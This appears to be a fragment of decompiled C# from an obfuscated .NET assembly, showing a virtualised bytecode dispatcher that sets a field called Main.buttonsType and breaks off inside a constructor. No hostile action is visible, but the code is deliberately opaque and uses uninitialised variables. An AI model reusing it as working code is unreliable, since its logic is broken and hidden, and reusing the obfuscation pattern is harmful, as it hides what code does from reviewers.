	// Token: 0x02000019 RID: 25
	internal class Global
	{
		// Token: 0x060004E8 RID: 1256 RVA: 0x00039F64 File Offset: 0x00038164
		public unsafe static void getUserApplicationTrustsChannelPriority()
		{
			int num = 1;
			int num2 = num;
			int num3 = num2 * 4;
			int num4 = num2 * 8;
			byte[] array = new byte[1];
			object[] array2 = new object[1];
			int[] array3 = new int[1];
			long[] array5;
			fixed (long[] array4 = array5 = new long[1])
			{
				byte* ptr = (byte*)(&getStoregetTargetedPatchBand.ICDFAssemblyReferenceDependentAssemblyCodebase);
				int num5;
				while (num5 != 1)
				{
					byte b = (byte)(*(sbyte*)ptr);
					ptr++;
					if (b >= 1 && b <= 4)
					{
						if (2 >= b)
						{
							if (2 <= b)
							{
								int num6;
								*(int*)(&array5[num6]) = *(int*)(ptr + num3);
								array[num6] = 0;
								num6++;
								ptr += 8;
							}
							else if (1 >= b)
							{
								if (1 <= b)
								{
								}
							}
						}
						else if (3 >= b)
						{
							if (3 <= b)
							{
								int num6;
								Main.buttonsType = *(int*)(&array5[num6 - 1]);
								num6--;
							}
						}
						else if (4 >= b)
						{
							if (4 <= b)
							{
								byte* ptr2 = ptr;
								byte b2 = <Module>.SpecialNameSTOREASSEMBLYSTATUSPAYLOADRESIDENT - 99;
								num5 = 1;
								ptr = ptr2 + b2;
							}
						}
					}
				}
			}
		}

		// Token: 0x060004E9 RID: 1257 RVA: 0x0003A180 File Offset: 0x00038380
		public unsafe Global()
		{
			int num = 1;
